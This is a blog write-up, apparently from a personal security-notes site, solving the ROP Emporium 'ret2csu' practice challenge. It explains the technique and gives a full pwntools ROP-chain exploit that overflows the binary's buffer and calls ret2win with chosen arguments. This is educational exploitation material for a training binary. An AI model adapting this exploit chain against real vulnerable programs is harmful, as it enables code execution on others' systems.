
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="When dealing with little useful gadget number or looking for a &#34;universal&#34; gadget solution, ret2csu is the answer. This technique results in the exploitation of the &#34;attached code&#34; by the linker to dynamically compiled applications. Some of this code is used at program-level to implement initializers and finalizers; for example …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="ROP Emporium - ret2csu"/>
  <meta property="og:description" content="When dealing with little useful gadget number or looking for a &#34;universal&#34; gadget solution, ret2csu is the answer. This technique results in the exploitation of the &#34;attached code&#34; by the linker to dynamically compiled applications. Some of this code is used at program-level to implement initializers and finalizers; for example …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/binary-exploitation/rop-emporium/ret2csu.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2024-03-30 18:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; ROP Emporium - ret2csu</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/rop-emporium/ret2csu">ROP Emporium - ret2csu</h1>
    <p>

    </p>
  </header>


  <div>
    <p>When dealing with little useful gadget number or looking for a "universal" gadget solution, <strong>ret2csu</strong> is the answer.</p>
<p>This technique results in the exploitation of the "attached code" by the linker to <strong>dynamically compiled applications</strong>. Some of this code is used at program-level to implement <em>initializers</em> and <em>finalizers</em>; for example, the <code>__libc_csu_init</code> function uses <code>__frame_dummy_init_array_entry</code> and <code>__init_array_end</code> to implement such features.</p>
<p>Basically, they're mechanisms controllable by the programmer to execute code after and before <code>main</code>.</p>
<p>Reference: <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p>
<p>Following symbols names and file linked in dynamic executables.</p>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>File</th>
</tr>
</thead>
<tbody>
<tr>
<td>deregister_tm_clones<br/>register_tm_clones<br/>__do_global_dtors_aux<br/>frame_dummy</td>
<td>/usr/lib/gcc/x86 64-linux-gnu/7/crtbeginS.o</td>
</tr>
<tr>
<td>__libc_csu_fini<br/>__libc_csu_init</td>
<td>/usr/lib/x86 64-linux-gnu/libc nonshared.a</td>
</tr>
<tr>
<td>_fini <br/>_init</td>
<td>/usr/lib/x86 64-linux-gnu/crti.o</td>
</tr>
<tr>
<td>_start</td>
<td>/usr/lib/x86 64-linux-gnu/Scrt1.o</td>
</tr>
</tbody>
</table>
<p>The ret2csu technique fundamentally takes advantages of some of the code from <code>__libc_csu_init</code>:</p>
<div class="highlight"><pre><span></span><code>...
mov %r13,%rdx
mov %r14,%rsi
mov %r15d,%edi
callq *(%r12,%rbx,8)
add $0x1,%rbx
cmp %rbx,%rbp
jne 1110 &lt;__libc_csu_init+0x40&gt;
add $0x8,%rsp
pop %rbx
pop %rbp
pop %r12
pop %r13
pop %r14
pop %r15
retq
</code></pre></div>
<p>There are two principal gadgets derivable from this code:</p>
<ul>
<li>The first will pop some values to <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>, <code>r15</code></li>
<li>The second will move these values from the previous registers to <code>rdi</code>, <code>rsi</code> and <code>rdx</code> registers. Moreover, a user controllable <code>callq</code> instruction to function is executed.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// ret2csu gadget 1</span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">rbx</span><span class="w"> </span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">rbp</span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">r12</span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">r13</span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">r14</span>
<span class="n">pop</span><span class="w"> </span>%<span class="n">r15</span>
<span class="n">retq</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1">// ret2csu gadget 2</span>
<span class="n">mov</span><span class="w"> </span>%<span class="n">r13</span><span class="p">,</span>%<span class="n">rdx</span>
<span class="n">mov</span><span class="w"> </span>%<span class="n">r14</span><span class="p">,</span>%<span class="n">rsi</span>
<span class="n">mov</span><span class="w"> </span>%<span class="n">r15d</span><span class="p">,</span>%<span class="n">edi</span>
<span class="n">callq</span><span class="w"> </span><span class="o">*</span><span class="p">(</span>%<span class="n">r12</span><span class="p">,</span>%<span class="n">rbx</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div>
<p>Note that <code>callq *(%r12,%rbx,8)</code> corresponds to <code>callq [%r12 + (%rbx + 8)]</code>. This means that the target function to execute must be stored at the address <code>[%r12 + (%rbx + 8)]</code>.</p>
<p>There are various possibilities to where to store the target function address: </p>
<ul>
<li>The heap or the stack, but a leak or a way to calculate where in memory the heap or the stack are located.</li>
<li>The GOT, which would contain effective address or PLT address for a function.</li>
<li>The addresses for some of the functions from the "attached code" linked to dynamic binaries are stored in memory, such as <code>_init</code> or <code>_fini</code>. These functions could be useful when looking for a "dummy" function lowly impacting on the state of the registers, for example, when using the ret2csu technique with the goal of populate registers due the lack of gadgets instead of aiming to execute arbitrary function. </li>
</ul>
<p>Also, after the called function returns (if no crash happens), the execution will continue because there's no <code>ret</code> after the <code>callq</code> instruction:</p>
<div class="highlight"><pre><span></span><code>add $0x1,%rbx
cmp %rbx,%rbp
jne 1110 &lt;__libc_csu_init+0x40&gt;
add $0x8,%rsp
pop %rbx
pop %rbp
pop %r12
pop %r13
pop %r14
pop %r15
retq
</code></pre></div>
<p>For this reason, there are two main factor to consider when ret2csu is used as part of a more complex ROP chain:</p>
<ul>
<li><code>cmp %rbx,%rbp</code> has to set the zero flag to 1 in order to skip the jump instruction (otherwise breaking the ROP chain and crashing). This is done by setting the <code>rbx</code> register to 0 (note the <code>add</code> instruction) and <code>rbp</code> register to 1 in the ret2csu first gadget.</li>
<li>The pop operation from first gadget will be executed again; this means that some padding is needed in the stack otherwise the next gadgets in the chain will be incorrectly popped.</li>
</ul>
<p>The goal for this challenge is to run the  <code>ret2win</code> function passing <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> as arguments to it in that order. Some <code>pop rdi</code> and <code>pop rsi</code> gadgets are available but no useful gadget to manipulate the <code>rax</code> register value. </p>
<p>Using the ret2csu would overcome this problem but another one arises:</p>
<ul>
<li><code>mov %r15d,%edi</code> copies only 8 bytes to the <code>rdi</code> register, making the <code>ret2win</code> execution to fail since it's expecting <code>0xdeadbeefdeadbeef</code> and not <code>0xdeadbeef</code> as first parameter.</li>
</ul>
<p>The strategy used to solve the challenge is the following:</p>
<ul>
<li>Use the ret2csu technique to populate <code>rsi</code> and <code>rdx</code>, then call <code>_fini</code> as a dummy function in order to continue the execution of the ROP chain</li>
<li>Use a <code>pop rdi ; ret</code> gadget to correctly populate <code>rdi</code> register</li>
<li>Execute <code>ret2win</code> by its PLT entry</li>
</ul>
<p>Following the complete pwntools solution:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./ret2csu'</span><span class="p">)</span>
<span class="n">ropper</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="c1">#p = process('./ret2csu') # type: pwnlib.tubes.process.process</span>
<span class="n">gdb_init</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">b ret2win</span>
<span class="s1">continue</span>
<span class="s1">'''</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">'./ret2csu'</span><span class="p">,</span> <span class="n">gdb_init</span><span class="p">)</span> <span class="c1"># type: pwnlib.tubes.process.process</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
<span class="n">libc_csu_init</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__libc_csu_init'</span><span class="p">]</span>
<span class="n">ret2csu_gadget1</span> <span class="o">=</span> <span class="n">libc_csu_init</span> <span class="o">+</span> <span class="mi">90</span>
<span class="n">ret2csu_gadget2</span> <span class="o">=</span> <span class="n">libc_csu_init</span> <span class="o">+</span> <span class="mi">64</span> 
<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="n">ropper</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop rdi'</span><span class="p">,</span> <span class="s1">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">ret2win_plt</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'ret2win'</span><span class="p">]</span>
<span class="n">fini</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_fini'</span><span class="p">])))</span>


<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"ret2csu gadget 1 address: 0x</span><span class="si">{</span><span class="n">ret2csu_gadget1</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"ret2csu gadget 2 address: 0x</span><span class="si">{</span><span class="n">ret2csu_gadget2</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"pop rdi ; ret gadget address: 0x</span><span class="si">{</span><span class="n">pop_rdi_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"ret2win PLT address: 0x</span><span class="si">{</span><span class="n">ret2win_plt</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="c1">#p.send(b"A" * offset +</span>
<span class="c1">#       p64(ret2csu_gadget1) + </span>
<span class="c1">#       p64(0x0) + # rbx</span>
<span class="c1">#       p64(0x1) + # rbp -&gt; set to 1 because  of "add rbx, 0x1; cmp  rbp, rbx" instructions</span>
<span class="c1">#       p64(fini) + # r12</span>
<span class="c1">#       p64(0xdeadbeefdeadbeef) + # r13 - this value is truncated</span>
<span class="c1">#       p64(0xcafebabecafebabe) + # r14</span>
<span class="c1">#       p64(0xd00df00dd00df00d) + # r15</span>
<span class="c1">#       p64(ret2csu_gadget2) + </span>
<span class="c1">#       p64(0) * 7 + # Padding needed because of next pop instructions in __libc_csu_init</span>
<span class="c1">#       p64(pop_rdi_gadget) +</span>
<span class="c1">#       p64(0xdeadbeefdeadbeef) +</span>
<span class="c1">#       p64(ret2win_plt))</span>
<span class="c1">#</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="n">ret2csu_gadget1</span><span class="p">)</span> <span class="o">+</span> 
       <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> 
       <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="n">fini</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="n">ret2csu_gadget2</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">+</span>
       <span class="n">p64</span><span class="p">(</span><span class="n">ret2win_plt</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2026 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>